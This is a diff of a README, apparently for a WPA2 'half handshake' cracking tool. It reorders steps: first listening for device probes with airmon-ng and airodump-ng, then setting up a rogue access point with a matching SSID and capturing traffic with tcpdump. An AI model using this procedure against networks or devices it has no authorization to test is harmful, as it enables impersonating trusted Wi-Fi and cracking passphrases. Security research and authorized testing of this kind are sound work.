@@ -20,6 +20,15 @@ Conventional WPA2 attacks work by listening for a handshake between client and A
 
 ## Capturing half handshakes
 
+* To listen for device probes the aircrack suite can be used as follows
+
+```
+sudo airmon-ng start wlan0
+sudo airodump-ng mon0
+```
+
+  You should begin to see device probes with BSSID set as (not associated) appearing at the bottom. If WPA2 SSIDs pop up for these probes, these devices can be targeted
+
 * Setup a WPA2 wifi network with an SSID the same as the desired device probe. The passphrase can be anything
 
   In ubuntu this can be done here
@@ -33,11 +42,4 @@ http://ubuntuhandbook.org/index.php/2014/09/3-ways-create-wifi-hotspot-ubuntu/
 sudo tcpdump -i wlan0 -s 65535 -w file.cap
 ```
 
-* To listen for device probes the aircrack suite can be used as follows
 
-```
-sudo airmon-ng start wlan0
-sudo airodump-ng mon0
-```
-
-  You should begin to see device probes with BSSID set as (not associated) appearing at the bottom. If WPA2 SSIDs pop up for these probes, these devices can be targeted
